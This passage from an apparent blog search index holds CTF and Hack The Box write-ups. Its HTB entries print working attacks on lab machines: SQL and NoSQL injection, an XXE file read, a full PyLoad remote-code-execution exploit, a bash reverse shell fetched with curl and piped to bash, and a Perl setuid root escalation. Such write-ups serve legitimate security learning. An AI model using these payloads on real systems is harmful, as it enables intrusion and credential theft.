= open('level5.flag.txt.enc', 'rb').read()correct_pw_hash = open('level5.hash.bin', 'rb').read()dictionary = open('dictionary.txt', 'r').readlines()def hash_pw(pw_str):pw_bytes = bytearray()pw_bytes.extend(pw_str.encode())m = hashlib.md5()m.update(pw_bytes)return m.digest()def level_5_pw_check():#user_pw = input(\"Please enter correct password for flag: \")for passwd in dictionary:user_pw = passwd.strip()user_pw_hash = hash_pw(user_pw)if( user_pw_hash == correct_pw_hash ):print(\"Welcome back... your flag, user:\")decryption = str_xor(flag_enc.decode(), user_pw)print(decryption)returnprint(\"That password is incorrect\")level_5_pw_check()for i in dictionary:level_5_pw_check(i.strip())The flag is:picoCTF{h45h_sl1ng1ng_fffcda23}" }, { "title": "Pw-Crack-4 from PicoCTF", "url": "/posts/PW-Crack-4-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Pw-Crack-4 from PicoCTFpage DescriptionCan you crack the password to get the flag?Download the password checker here and you’ll need the encrypted flag and the hash in the same directory too.There are 100 potential passwords with only 1 being correct. You can find these by examining the password checker script.So basically you have to write for loop so system checks every password. It should be like this:import hashlib ### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################def str_xor(secret, key):#extend key to secret lengthnew_key = keyi = 0while len(new_key) &lt; len(secret):new_key = new_key + key[i]i = (i + 1) % len(key)return \"\".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])############################################################################### flag_enc = open('level4.flag.txt.enc', 'rb').read()correct_pw_hash = open('level4.hash.bin', 'rb').read() def hash_pw(pw_str):pw_bytes = bytearray()pw_bytes.extend(pw_str.encode())m = hashlib.md5()m.update(pw_bytes)return m.digest() pos_pw_list = [\"158f\", \"1655\", \"d21e\", \"4966\", \"ed69\", \"1010\", \"dded\", \"844c\", \"40ab\", \"a948\", \"156c\", \"ab7f\", \"4a5f\", \"e38c\", \"ba12\", \"f7fd\", \"d780\", \"4f4d\", \"5ba1\", \"96c5\", \"55b9\", \"8a67\", \"d32b\", \"aa7a\", \"514b\", \"e4e1\", \"1230\", \"cd19\", \"d6dd\", \"b01f\", \"fd2f\", \"7587\", \"86c2\", \"d7b8\", \"55a2\", \"b77c\", \"7ffe\", \"4420\", \"e0ee\", \"d8fb\", \"d748\", \"b0fe\", \"2a37\", \"a638\", \"52db\", \"51b7\", \"5526\", \"40ed\", \"5356\", \"6ad4\", \"2ddd\", \"177d\", \"84ae\", \"cf88\", \"97a3\", \"17ad\", \"7124\", \"eff2\", \"e373\", \"c974\", \"7689\", \"b8b2\", \"e899\", \"d042\", \"47d9\", \"cca9\", \"ab2a\", \"de77\", \"4654\", \"9ecb\", \"ab6e\", \"bb8e\", \"b76b\", \"d661\", \"63f8\", \"7095\", \"567e\", \"b837\", \"2b80\", \"ad4f\", \"c514\", \"ffa4\", \"fc37\", \"7254\", \"b48b\", \"d38b\", \"a02b\", \"ec6c\", \"eacc\", \"8b70\", \"b03e\", \"1b36\", \"81ff\", \"77e4\", \"dbe6\", \"59d9\", \"fd6a\", \"5653\", \"8b95\", \"d0e5\"] def level_4_pw_check():# user_pw = input(\"Please enter correct password for flag: \")for user_pw in pos_pw_list:user_pw_hash = hash_pw(user_pw)if( user_pw_hash == correct_pw_hash ):print(\"Welcome back... your flag, user:\")decryption = str_xor(flag_enc.decode(), user_pw)print(decryption)returnprint(\"That password is incorrect\") level_4_pw_check()The flag is:picoCTF{fl45h_5pr1ng1ng_cf341ff1}" }, { "title": "Pw-Crack-3 from PicoCTF", "url": "/posts/PW-Crack-3-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Pw-Crack-3 from PicoCTFpage Description Can you crack the password to get the flag?Download the password checker here and you’ll need the encrypted flag and the hash in the same directory too.There are 7 potential passwords with 1 being correct. You can find these by examining the password checker script.$ cat level3.pyimport hashlib### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################def str_xor(secret, key): #extend key to secret length new_key = key i = 0 while len(new_key) &lt; len(secret): new_key = new_key + key[i] i = (i + 1) % len(key) return \"\".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])###############################################################################flag_enc = open('level3.flag.txt.enc', 'rb').read()correct_pw_hash = open('level3.hash.bin', 'rb').read()def hash_pw(pw_str): pw_bytes = bytearray() pw_bytes.extend(pw_str.encode()) m = hashlib.md5() m.update(pw_bytes) return m.digest()def level_3_pw_check(): user_pw = input(\"Please enter correct password for flag: \") user_pw_hash = hash_pw(user_pw) if( user_pw_hash == correct_pw_hash ): print(\"Welcome back... your flag, user:\") decryption = str_xor(flag_enc.decode(), user_pw) print(decryption) return print(\"That password is incorrect\")level_3_pw_check()# The strings below are 7 possibilities for the correct password. # (Only 1 is correct)pos_pw_list = [\"8799\", \"d3ab\", \"1ea2\", \"acaf\", \"2295\", \"a9de\", \"6f3d\"]We just have to modify the code and use For loop so it will check all the passwords in listIt will be like this:import hashlib ### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################def str_xor(secret, key):#extend key to secret lengthnew_key = keyi = 0while len(new_key) &lt; len(secret):new_key = new_key + key[i]i = (i + 1) % len(key)return \"\".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])############################################################################### flag_enc = open('level3.flag.txt.enc', 'rb').read()correct_pw_hash = open('level3.hash.bin', 'rb').read() def hash_pw(pw_str):pw_bytes = bytearray()pw_bytes.extend(pw_str.encode())m = hashlib.md5()m.update(pw_bytes)return m.digest() pos_pw_list = [\"8799\", \"d3ab\", \"1ea2\", \"acaf\", \"2295\", \"a9de\", \"6f3d\"]def level_3_pw_check():#user_pw = input(\"Please enter correct password for flag: \")for user_pw in pos_pw_list:user_pw_hash = hash_pw(user_pw)if( user_pw_hash == correct_pw_hash ):print(\"Welcome back... your flag, user:\")decryption = str_xor(flag_enc.decode(), user_pw)print(decryption)returnprint(\"That password is incorrect\") level_3_pw_check()and the flag is:picoCTF{m45h_fl1ng1ng_6f98a49f}" }, { "title": "PC from HTB", "url": "/posts/PC-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "PC from HTBNmapgave this:nmap -sCV --min-rate 4000 -Pn -p- 10.10.11.214Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 20:41 +04Nmap scan report for 10.10.11.214Host is up (0.096s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)| 256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)|_ 256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)50051/tcp open unknownI can’t access that port. So i searched it up and it’s main use is for gRPC. There is an command for that: grpcurland i used it. I’m tired and can’t explain. I basically used sql injection:giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 listSimpleAppgrpc.reflection.v1alpha.ServerReflectiongiorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 list SimpleAppSimpleApp.LoginUserSimpleApp.RegisterUserSimpleApp.getInfogiorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp.LoginUserFailed to resolve symbol \"SimpleApp.LoginUser\": Symbol not found: SimpleApp.LoginUsergiorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleAppSimpleApp is a service:service SimpleApp { rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse ); rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse ); rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );}giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe LoginUserRequestLoginUserRequest is a message:message LoginUserRequest { string username = 1; string password = 2;}giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe LoginUserResponseLoginUserResponse is a message:message LoginUserResponse { string message = 1;}giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe RegisterUserRequestRegisterUserRequest is a message:message RegisterUserRequest { string username = 1; string password = 2;}giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe RegisterUserResponseRegisterUserResponse is a message:message RegisterUserResponse { string message = 1;}giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe getInfoRequestgetInfoRequest is a message:message getInfoRequest { string id = 1;}giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe getInfoResponsegetInfoResponse is a message:message getInfoResponse { string message = 1;}giorgi@darkfears31:~$ grpcurl -plaintext -format text -d 'username: \"shavi\", password: \"gio1\"' 10.10.11.214:50051 SimpleApp.RegisterUsermessage: \"Account created for user shavi!\"giorgi@darkfears31:~$ grpcurl -plaintext -format text -vv -d 'username: \"shavi\", password: \"gio1\"' 10.10.11.214:50051 SimpleApp.LoginUserResolved method descriptor:rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );Request metadata to send:(empty)Response headers received:content-type: application/grpcgrpc-accept-encoding: identity, deflate, gzipEstimated response size: 17 bytesResponse contents:message: \"Your id is 580.\"Response trailers received:token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' # be sure to double check the IDgiorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: \"580\"' 10.10.11.214:50051 SimpleApp.getInfomessage: \"Will update soon.\"giorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: \"580 OR 1=1\"' 10.10.11.214:50051 SimpleApp.getInfomessage: \"The admin is working hard to fix the issues.\"giorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: \"580 UNION SELECT 1-- -\"' 10.10.11.214:50051 SimpleApp.getInfomessage: \"1\"giorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: \"123 UNION SELECT GROUP_CONCAT(name, \\\",\\\") FROM pragma_table_info(\\\"accounts\\\");--\"' 10.10.11.214:50051 SimpleApp.getInfomessage: \"username,password\"giorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: \"123 UNION SELECT GROUP_CONCAT(username || password) FROM accounts;--\"' 10.10.11.214:50051 SimpleApp.getInfomessage: \"adminadmin,sauHereIsYourPassWord1431\"And there it is: Password —- HereIsYourPassWord1431 Username —- sauConnect to ssh with this credentials. And get the user flag:**User Flag is: a5a6a24888a0510e7d6b683d1afcc9de**sau@pc:~$ ss -tlpnState Recv-Q Send-Q Local Address:Port Peer Address:Port ProcessLISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*LISTEN 0 128 0.0.0.0:22 0.0.0.0:*LISTEN 0 5 127.0.0.1:8000 0.0.0.0:*LISTEN 0 128 0.0.0.0:9666 0.0.0.0:*This shows that there are two ports running locally, but we don’t know what so let’s do port forwarding to access it. On our machine run:$ ssh -f -N -L 1235:127.0.0.1:8000 -L 9666:127.0.0.1:9666 sau@10.10.11.214sau@10.10.11.214's password:Then access the localhost:8000and on that is running pyload. Go to sshand check the version:pyload --versionpyLoad 0.5.0There is an exploit for that RCEand with that we have to get reverse shellFrom exploit-dbi got this code:# Exploit Title: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)# Date: 06-10-2023# Credits: bAu @bauh0lz# Exploit Author: Gabriel Lima (0xGabe)# Vendor Homepage: https://pyload.net/# Software Link: https://github.com/pyload/pyload# Version: 0.5.0# Tested on: Ubuntu 20.04.6# CVE: CVE-2023-0297import requests, argparseparser = argparse.ArgumentParser()parser.add_argument('-u', action='store', dest='url', required=True, help='Target url.')parser.add_argument('-c', action='store', dest='cmd', required=True, help='Command to execute.')arguments = parser.parse_args()def doRequest(url): try: res = requests.get(url + '/flash/addcrypted2') if res.status_code == 200: return True else: return False except requests.exceptions.RequestException as e: print(\"[!] Maybe the host is offline :\", e) exit()def runExploit(url, cmd): endpoint = url + '/flash/addcrypted2' if \" \" in cmd: validCommand = cmd.replace(\" \", \"%20\") else: validCommand = cmd payload = 'jk=pyimport%20os;os.system(\"'+validCommand+'\");f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa' test = requests.post(endpoint, headers={'Content-type': 'application/x-www-form-urlencoded'},data=payload) print('[+] The exploit has be executeded in target machine. ')def main(targetUrl, Command): print('[+] Check if target host is alive: ' + targetUrl) alive = doRequest(targetUrl) if alive == True: print(\"[+] Host up, let's exploit! \") runExploit(targetUrl,Command) else: print('[-] Host down! ')if(arguments.url != None and arguments.cmd != None): targetUrl = arguments.url Command = arguments.cmd main(targetUrl, Command)Giving this code reverse shellcommands will not run it because it doesn’t like special charactersso create reverse.sh :bash -c '/bin/sh -i &gt;&amp; /dev/tcp/10.10.16.2/1234 0&gt;&amp;1'Then start python3 -m http.server 8001and execute this code:python3 pyload.py -u http://localhost:8000 -c \"curl 10.10.16.2:8001/reverse.sh| bash\"This will get you connection on NetCatand you are root.**Root Flag is: f2371dd1159ce579cde530425eb577b5**" }, { "title": "Operation-Orchid from PicoCTF", "url": "/posts/Operation-Orchid-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Operation-Orchid from PicoCTFpage DescriptionDownload this disk image and find the flag.Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory. Download compressed disk image First it’s a .gz file so use gunzip and we are left with disk.flag.img. After that use sleuth kit:$ mmls disk.flag.imgDOS Partition TableOffset Sector: 0Units are in 512-byte sectors Slot Start End Length Description000: Meta 0000000000 0000000000 0000000001 Primary Table (#0)001: ------- 0000000000 0000002047 0000002048 Unallocated002: 000:000 0000002048 0000206847 0000204800 Linux (0x83)003: 000:001 0000206848 0000411647 0000204800 Linux Swap / Solaris x86 (0x82)004: 000:002 0000411648 0000819199 0000407552 Linux (0x83)Then we have to mount it into some file, I chose tmp file and named it something.$ sudo mount disk.flag.img /tmp/something -o offset=$((411648*512))The offset (411648*512) is used to skip a specific number of bytes at the beginning of the disk image file. This is often necessary when dealing with images that contain multiple partitions or when you need to mount a specific partition within the image. The calculation here suggests that the data you want to mount starts at byte 411648 * 512 = 210763776 in the image file./tmp$ cd something//tmp/something$ lsbin boot dev etc home lib lost+found media mnt opt proc root run sbin srv swap sys tmp usr var/tmp/something$ sudo su[sudo] password for giorgi: ┌──(root㉿darkfears31)-[/tmp/something]└─# cd root┌──(root㉿darkfears31)-[/tmp/something/root]└─# lsflag.txt.enc┌──(root㉿darkfears31)-[/tmp/something/root]└─# ls -alltotal 4drwx------ 2 root root 1024 Oct 6 2021 .drwxr-xr-x 22 root root 1024 Oct 6 2021 ..-rw------- 1 root root 202 Oct 6 2021 .ash_history-rw-r--r-- 1 root root 64 Oct 6 2021 flag.txt.enc┌──(root㉿darkfears31)-[/tmp/something/root]└─# cat .ash_history touch flag.txtnano flag.txt apk get nanoapk --helpapk add nanonano flag.txt opensslopenssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567shred -u flag.txtls -alhaltFrom here we know that flag.txt.enc is encoded with openSSl aes256+ salted and the password is unbreakablepassword1234567. So we have to reverse that code to decode and get the flag:┌──(root㉿darkfears31)-[/tmp/something/root]└─# openssl aes256 -d -salt -in flag.txt.enc -out flag.txt -k unbreakablepassword1234567; cat flag.txt*** WARNING : deprecated key derivation used.Using -iter or -pbkdf2 would be better.bad decrypt80965819F77F0000:error:1C800064:Provider routines:ossl_cipher_unpadblock:bad decrypt:../providers/implementations/ciphers/ciphercommon_block.c:107:picoCTF{h4un71ng_p457_0a710765}And the flag is: picoCTF{h4un71ng_p457_0a710765}" }, { "title": "Operation-Oni from PicoCTF", "url": "/posts/Operation-Oni-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Operation-Oni from PicoCTFpage DescriptionDownload this disk image, find the key and log into the remote machine.Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory. Download disk image Remote machine: ssh -i key_file -p &lt;port&gt; ctf-player@saturn.picoctf.net First download it and it’s .gz file for that use gunzip and we are left with disk.img.Then i did this:$ mmls disk.img DOS Partition TableOffset Sector: 0Units are in 512-byte sectors Slot Start End Length Description000: Meta 0000000000 0000000000 0000000001 Primary Table (#0)001: ------- 0000000000 0000002047 0000002048 Unallocated002: 000:000 0000002048 0000206847 0000204800 Linux (0x83)003: 000:001 0000206848 0000471039 0000264192 Linux (0x83)$ sudo mount disk.img something -o offset=$((206848*512))I mounted disk.img into something. I became superuser with sudo su and proceeded doing this:┌──(root㉿darkfears31)-[/home/giorgi/Desktop/picoctf]└─# cd something/┌──(root㉿darkfears31)-[/home/giorgi/Desktop/picoctf/something]└─# lsbin boot dev etc home lib lost+found media mnt opt proc root run sbin srv sys tmp usr var┌──(root㉿darkfears31)-[/home/giorgi/Desktop/picoctf/something]└─# cd root┌──(root㉿darkfears31)-[/home/giorgi/Desktop/picoctf/something/root]└─# ls┌──(root㉿darkfears31)-[/home/giorgi/Desktop/picoctf/something/root]└─# ls -alltotal 4drwx------ 3 root root 1024 Oct 6 2021 .drwxr-xr-x 21 root root 1024 Oct 6 2021 ..-rw------- 1 root root 36 Oct 6 2021 .ash_historydrwx------ 2 root root 1024 Oct 6 2021 .ssh┌──(root㉿darkfears31)-[/home/giorgi/Desktop/picoctf/something/root]└─# cat .ash_history ssh-keygen -t ed25519ls .ssh/halt┌──(root㉿darkfears31)-[/home/giorgi/Desktop/picoctf/something/root]└─# cd .ssh/┌──(root㉿darkfears31)-[/home/giorgi/Desktop/picoctf/something/root/.ssh]└─# lsid_ed25519 id_ed25519.pub┌──(root㉿darkfears31)-[/home/giorgi/Desktop/picoctf/something/root/.ssh]└─# cat id_ed25519-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACBgrXe4bKNhOzkCLWOmk4zDMimW9RVZngX51Y8h3BmKLAAAAJgxpYKDMaWCgwAAAAtzc2gtZWQyNTUxOQAAACBgrXe4bKNhOzkCLWOmk4zDMimW9RVZngX51Y8h3BmKLAAAAECItu0F8DIjWxTp+KeMDvX1lQwYtUvP2SfSVOfMOChxYGCtd7hso2E7OQItY6aTjMMyKZb1FVmeBfnVjyHcGYosAAAADnJvb3RAbG9jYWxob3N0AQIDBAUGBw==-----END OPENSSH PRIVATE KEY-----I took the key that we need to connect to ssh and created file named key_fileas requested in Description$ nano key_file$ chmod 600 key_file $ ssh -i key_file -p 60683 ctf-player@saturn.picoctf.netThe authenticity of host '[saturn.picoctf.net]:60683 ([13.59.203.175]:60683)' can't be established.ED25519 key fingerprint is SHA256:XBSvB1lk28EctsAVdKJtsl0A7C5bonqPrvHCYH8aEy4.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[saturn.picoctf.net]:60683' (ED25519) to the list of known hosts.Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1016-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantageThis system has been minimized by removing packages and content that arenot required on a system that users do not log into.To restore this content, you can run the 'unminimize' command.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.ctf-player@challenge:~$ lsflag.txtctf-player@challenge:~$ cat flag.txt picoCTF{k3y_5l3u7h_b5066e83}And here is the flag:picoCTF{k3y_5l3u7h_b5066e83}" }, { "title": "NunChucks from HTB", "url": "/posts/Nunchucks-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "NunChucks from HTBnmap gave this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)| 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)|_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://nunchucks.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)443/tcp open ssl/http nginx 1.18.0 (Ubuntu)| tls-alpn:|_ http/1.1|_http-title: 400 The plain HTTP request was sent to HTTPS port| tls-nextprotoneg:|_ http/1.1| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb| Not valid before: 2021-08-30T15:42:24|_Not valid after: 2031-08-28T15:42:24|_ssl-date: TLS randomness does not represent time|_http-server-header: nginx/1.18.0 (Ubuntu)Add this to /etc/hosts10.10.11.122 nunchucks.htbAccess the site and try to sign up but it’s closed so let’s try to discover some other subdomainsffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.nunchucks.htb\" -u https://nunchucks.htb/ -fs 30589 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev________________________________________________ :: Method : GET :: URL : https://nunchucks.htb/ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.nunchucks.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 30589________________________________________________store [Status: 200, Size: 4029, Words: 1053, Lines: 102Add this to /etc/hosts10.10.11.122 store.nunchucks.htbThen access that subdomainWith wappalyzerwe get that site runs onProgramming languages Node.jsSo maybe it’s vulnerable to sstiLet’s try first payload in your email here...@htb.comWe get this##### You will receive updates on the following email address: 49@htb.com.so it’s vulnerable to sstiSo let’s search for ssti injection nodejsand let’s use nunjuckshttps://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucksWe can’t type this normally so lets use burpsuite + interceptAnd we get this:\"response\":\"You will receive updates on the following email address: lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\\nrtkit:x:113:117:RealtimeKit,,,:/proc:/usr/sbin/nologin\\ndnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\\ngeoclue:x:115:120::/var/lib/geoclue:/usr/sbin/nologin\\navahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\\ncups-pk-helper:x:117:123:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\\nsaned:x:118:124::/var/lib/saned:/usr/sbin/nologin\\ncolord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\\npulse:x:120:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\\nmysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false\\n@htb.com.\"This is /etc/passwdfile now lets get reverse shell{ \"email\": \"@htb.com\"}This gave me connection on netcat**User Flag is: 17949c8542ff2ef9dbfb2123ed2176c2**Then try to get sshconnection by running$ ssh-keygensave id_rsa on your machine and chmod 600 id_rsacopy machines id_rsa.pubto ~/.ssh/authorized_keysthen connect to sshssh -i id_rsa david@10.10.11.122we are in.Enumerating the filesystem we see that Perl has setuid capabilities set.david@nunchucks:~$ getcap -r / 2&gt;/dev/null/usr/bin/perl = cap_setuid+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/ping = cap_net_raw+ep/usr/bin/traceroute6.iputils = cap_net_raw+ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+epin https://gtfobins.github.io/gtfobins/perl/#capabilities we can see what we can do with perlperl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'cat: /etc/shadow: Permission denieddavid@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"whoami\";'rootWe can’t read root flagdavid@nunchucks:/etc/apparmor.d$ cat usr.bin.perl# Last Modified: Tue Aug 31 18:25:30 2021#include &lt;tunables/global&gt;/usr/bin/perl { #include &lt;abstractions/base&gt; #include &lt;abstractions/nameservice&gt; #include &lt;abstractions/perl&gt; capability setuid, deny owner /etc/nsswitch.conf r, deny /root/* rwx, deny /etc/shadow rwx, /usr/bin/id mrix, /usr/bin/ls mrix, /usr/bin/cat mrix, /usr/bin/whoami mrix, /opt/backup.pl mrix, owner /home/ r, owner /home/david/ r,}Then try to find other .plfilesdavid@nunchucks:/opt$ lsbackup.pl web_backupsdavid@nunchucks:/opt$ cat backup.pl#!/usr/bin/perluse strict;use POSIX qw(strftime);use DBI;use POSIX qw(setuid);POSIX::setuid(0);my $tmpdir = \"/tmp\";my $backup_main = '/var/www';my $now = strftime(\"%Y-%m-%d-%s\", localtime);my $tmpbdir = \"$tmpdir/backup_$now\";sub printlog{ print \"[\", strftime(\"%D %T\", localtime), \"] $_[0]\\n\";}sub archive{ printlog \"Archiving...\"; system(\"/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null\"); printlog \"Backup complete in $tmpbdir/backup_$now.tar\";}if ($&gt; != 0) { die \"You must run this script as root.\\n\";}printlog \"Backup starts.\";mkdir($tmpbdir);&amp;archive;printlog \"Moving $tmpbdir/backup_$now to /opt/web_backups\";system(\"/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/\");printlog \"Removing temporary directory\";rmdir($tmpbdir);printlog \"Completed\";Checking the backup.pl we see that it has the setuid applied to the script, but we cannot write or make any changes to the execution of the script.IDK how and why but create this script and execute it which will make you root#!/usr/bin/perluse POSIX qw(setuid);POSIX::setuid(0);exec \"/bin/bash\";Root Flag is: 806a8e65c673b5079524748e734c338e***" }, { "title": "NodeBlog from HTB", "url": "/posts/NodeBlog-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "NodeBlog from HTBnmapgave this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)| 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)|_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)5000/tcp open http Node.js (Express middleware)|_http-title: BlogService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelturn on burpsuite + interceptand try to login like this------------------------Content-Type: application/json-------------------------------{\"user\":\"admin\",\"password\":{\"$ne\":\"admin\"}}uploading fileInvalid XML Example: Example DescriptionExample MarkdownMust me xmlfile.xml&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY help SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;post&gt;&lt;title&gt;shavigio&lt;/title&gt;&lt;description&gt;Read File&lt;/description&gt;&lt;markdown&gt;&amp;help;&lt;/markdown&gt;&lt;/post&gt;Uploaded and got 